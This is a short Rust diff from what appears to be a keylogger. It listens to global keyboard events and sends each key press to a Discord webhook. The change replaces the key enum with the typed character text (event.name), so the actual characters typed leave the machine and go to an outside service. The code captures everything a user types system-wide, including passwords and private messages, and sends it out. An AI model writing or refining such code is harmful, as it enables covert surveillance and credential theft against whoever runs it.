@@ -26,15 +26,17 @@ fn main() {
     // listening global key events
 
     if let Err(error) = listen(move |event: Event| {   
-        //println!("My callback {:?}", event);
+        //println!("{:?}", event);
         //println!("{:?}", event.event_type);
+        //println!("{:?}", event.name);
 
         match event.event_type {
             EventType::KeyPress(Key) => {
                 let discord_client = discord_client.clone(); 
-                println!("{:?}", Key);
+                let text: String = event.name.unwrap().clone();
+                println!("{:?}", text);
                 task::spawn(async move {
-                    discord_client.send_webhook(Key.as_str());
+                    discord_client.send_webhook(&text);
                 });
             },
             _ => (),
